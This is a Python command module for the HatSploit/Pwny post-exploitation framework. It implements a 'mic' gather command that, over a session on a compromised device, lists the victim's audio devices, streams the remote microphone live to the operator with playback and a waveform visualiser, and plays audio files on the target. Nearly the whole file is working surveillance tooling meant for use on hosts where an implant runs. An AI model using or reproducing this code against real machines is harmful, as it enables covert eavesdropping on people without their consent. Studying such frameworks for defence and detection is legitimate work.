"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import wave
import pyaudio
import threading

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

import subprocess
import sys

import numpy as np

CHUNK = 1024
WIDTH = 2

MIC_BASE = 6

MIC_PLAY = tlv_custom_tag(API_CALL_STATIC, MIC_BASE, API_CALL)
MIC_LIST = tlv_custom_tag(API_CALL_STATIC, MIC_BASE, API_CALL + 1)

MIC_PIPE = tlv_custom_pipe(PIPE_STATIC, MIC_BASE, PIPE_TYPE)


_MIC_VIZ_CODE = '''
import sys
import threading
import queue

import numpy as np
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation

SAMPLES = 2048
FRAME_SIZE = SAMPLES * 2

q = queue.Queue(maxsize=30)
done = threading.Event()

def reader():
    try:
        while True:
            raw = sys.stdin.buffer.read(FRAME_SIZE)
            if not raw or len(raw) < FRAME_SIZE:
                break
            data = np.frombuffer(raw, dtype=np.int16)
            try:
                q.put_nowait(data)
            except queue.Full:
                try:
                    q.get_nowait()
                except queue.Empty:
                    pass
                q.put_nowait(data)
    finally:
        done.set()

fig, ax = plt.subplots()
x = np.arange(0, SAMPLES, 1)
line, = ax.plot(x, np.zeros(SAMPLES), "-")
ax.set_ylim(-32768, 32767)
ax.set_xlim(0, SAMPLES)
ax.set_title("Audio Stream Visualization")
ax.set_xlabel("Samples")
ax.set_ylabel("Amplitude")

t = threading.Thread(target=reader, daemon=True)
t.start()

def update(frame):
    if done.is_set():
        plt.close(fig)
        return line,
    try:
        while not q.empty():
            data = q.get_nowait()
            line.set_ydata(data)
    except Exception:
        pass
    return line,

ani = FuncAnimation(fig, update, blit=True, interval=50,
                    cache_frame_data=False)
plt.show()
'''


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "mic",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in microphone.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-l', '--list'),
                    {
                        'help': "List available audio devices.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-p', '--play'),
                    {
                        'help': "Play specified audio file.",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-S', '--stream'),
                    {
                        'help': "Stream selected device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-L',),
                    {
                        'help': "List actively streaming devices.",
                        'dest': 'streams',
                        'action': 'store_true'
                    }
                ),
                (
                    ('-c', '--close'),
                    {
                        'help': "Close all streams for device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-o', '--output'),
                    {
                        'help': "Local file to save audio to (.wav).",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-r', '--rate'),
                    {
                        'help': "Specify rate for audio (default: 48000)",
                        'type': int,
                        'default': 48000
                    }
                ),
                (
                    ('-C', '--channels'),
                    {
                        'help': "Specify number of channels (default: 2)",
                        'type': int,
                        'default': 1
                    }
                ),
                (
                    ('-f', '--format'),
                    {
                        'help': "Specify format (default: cd)",
                        'choices': ['cd', 'dat'],
                        'default': 'cd'
                    }
                )
            ]
        })

        self.running = {}

    def _stream_thread(self, device):
        """Background thread: reads pipe, plays audio, feeds visualization."""

        while device in self.running:
            stream = self.running.get(device)
            if not stream:
                break

            audio = self.session.pipes.read_pipe(
                pipe_type=MIC_PIPE,
                pipe_id=stream['ID'],
                size=CHUNK * WIDTH * 2
            )

            data = np.frombuffer(audio, dtype=np.int16)

            if len(data) == 0:
                continue

            if len(data) < 2048:
                viz_data = np.pad(data, (0, 2048 - len(data)))
            elif len(data) > 2048:
                viz_data = data[:2048]
            else:
                viz_data = data

            try:
                stream['Process'].stdin.write(
                    viz_data.astype(np.int16).tobytes())
                stream['Process'].stdin.flush()
            except (BrokenPipeError, OSError):
                pass

            try:
                stream['Stream'].write(audio)
            except Exception:
                pass

    def run(self, args):
        if args.list:
            result = self.session.send_command(
                tag=MIC_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id += 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.close:
            stream = self.running.get(args.close, None)

            if not stream:
                self.print_error(f"Device #{str(args.close)} not streaming!")
                return

            self.running.pop(args.close, None)
            self.print_process(f"Suspending device #{str(args.close)}...")

            self.session.pipes.destroy_pipe(MIC_PIPE, stream['ID'])

            stream['Stream'].stop_stream()
            stream['Stream'].close()

            stream['Audio'].terminate()

            try:
                stream['Process'].stdin.close()
            except Exception:
                pass

            stream['Process'].terminate()

        elif args.streams:
            data = []

            for device, stream in self.running.items():
                data.append((device, stream['Stream']._rate))

            if not data:
                self.print_warning('No active streams running.')
                return

            self.print_table('Active streams', ('ID', 'Rate'), *data)

        elif args.stream:
            stream = self.running.get(args.stream, None)

            if stream:
                self.print_warning(f"Device #{str(args.stream)} is already streaming.")
                return

            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=MIC_PIPE,
                    args={
                        TLV_TYPE_INT: args.stream
                    }
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            self.print_process(f"Streaming device #{str(args.stream)}...")

            audio = pyaudio.PyAudio()
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=args.channels,
                rate=args.rate,
                frames_per_buffer=CHUNK // WIDTH,
                output=True
            )

            proc = subprocess.Popen(
                [sys.executable, '-c', _MIC_VIZ_CODE],
                stdin=subprocess.PIPE
            )

            self.running.update({
                args.stream: {
                    'Stream': stream,
                    'Audio': audio,
                    'ID': pipe_id,
                    'Process': proc,
                }
            })

            thread = threading.Thread(
                target=self._stream_thread,
                args=(args.stream,))
            thread.daemon = True
            thread.start()

            self.running[args.stream]['Thread'] = thread
            self.print_process("Visualizing live audio wave...")

        elif args.play:
            with open(args.play, 'rb') as f:
                self.print_process("Playing audio file on device...")

                result = self.session.send_command(
                    tag=MIC_PLAY,
                    args={
                        TLV_TYPE_BYTES: f.read(),
                    }
                )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to play audio file!")
                return
